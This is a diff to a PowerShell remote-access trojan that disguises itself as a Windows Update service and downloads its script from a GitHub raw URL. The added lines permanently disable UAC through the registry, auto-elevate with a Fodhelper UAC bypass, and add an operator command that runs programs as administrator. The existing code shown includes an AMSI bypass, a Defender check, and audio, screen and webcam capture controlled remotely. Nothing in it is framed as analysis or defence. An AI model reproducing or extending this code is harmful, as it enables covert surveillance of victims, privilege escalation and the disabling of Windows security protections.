@@ -9,8 +9,6 @@ $h = [System.BitConverter]::ToString(
 $installName  = "WinUpdateSvc_$h"
 $taskName     = "MicrosoftWindowsUpdateService_$h"
 $taskBootName = "MicrosoftWindowsUpdateBoot_$h"
-$shadowName   = "MicrosoftCompatibilityAppraiser_$h"
-$shadowPath   = "\Microsoft\Windows\Application Experience\$shadowName"
 $mutexName    = "Local\WinUpdateSvcMutex_$h"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
@@ -26,6 +24,13 @@ $vbsPath = "$dir\$installName.vbs"
 $bootPath = "$dir\boot_launcher.ps1"
 
 if ($args -notcontains "-silent") {
+    # Desativar UAC permanentemente
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
+    } catch {}
+
     $defenderOff = $false
     try {
         $mp = Get-MpComputerStatus -ErrorAction Stop
@@ -119,6 +124,19 @@ while (`$true) {
 # -silent
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
+
+# AUTO-ELEVAÇÃO SEM REINICIAR (Bypass Fodhelper)
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    try {
+        $k = "HKCU:\Software\Classes\ms-settings\shell\open\command"
+        New-Item -Path $k -Force -ErrorAction SilentlyContinue | Out-Null
+        Set-ItemProperty -Path $k -Name "(Default)" -Value "powershell.exe -nop -w hidden -ep bypass -f `"$scriptPath`" -silent" -Force -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path $k -Name "DelegateExecute" -Value "" -Force -ErrorAction SilentlyContinue
+        Start-Process "fodhelper.exe" -WindowStyle Hidden
+    } catch {}
+    exit
+}
 
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0)) { exit }
@@ -468,7 +486,6 @@ if (-not ("R9KAgent" -as [type])) {
 
                     WAVEFORMATEX wfx = (WAVEFORMATEX)Marshal.PtrToStructure(pFormat, typeof(WAVEFORMATEX));
                     
-                    // 0x00080000 = AUDCLNT_STREAMFLAGS_LOOPBACK
                     hr = audioClient.Initialize(0, 0x00080000, 10000000, 0, pFormat, IntPtr.Zero);
                     if (hr != 0) {
                         lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Driver de audio nao suporta Loopback (HR=0x" + hr.ToString("X") + ")"); }
@@ -628,6 +645,26 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 if (cmd == "audio_start") { StartAudio(); lock(writeLock) { myWriter.WriteLine("AUDIO_ON"); } return; }
                 if (cmd == "audio_stop") { isAudioRunning = false; lock(writeLock) { myWriter.WriteLine("AUDIO_OFF"); } return; }
+                
+                // COMANDO NOVO DE BYPASS PARA ABRIR PROGRAMAS DIRETO COMO ADMIN
+                if (cmd.StartsWith("run_admin ")) {
+                    string target = cmd.Substring(10).Trim();
+                    try {
+                        string k = @"Software\Classes\ms-settings\shell\open\command";
+                        using (RegistryKey key = Registry.CurrentUser.CreateSubKey(k)) {
+                            key.SetValue("", target, RegistryValueKind.String);
+                            key.SetValue("DelegateExecute", "", RegistryValueKind.String);
+                        }
+                        Process.Start("fodhelper.exe");
+                        Thread.Sleep(1500);
+                        try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings"); } catch {}
+                        lock (writeLock) { myWriter.WriteLine("ELEVATE_OK: " + target); }
+                    } catch (Exception ex) {
+                        lock (writeLock) { myWriter.WriteLine("ELEVATE_ERR: " + ex.Message); }
+                    }
+                    return;
+                }
+
                 if (cmd == "webcam") {
                     string b64 = CaptureWebcam();
                     lock (writeLock) {
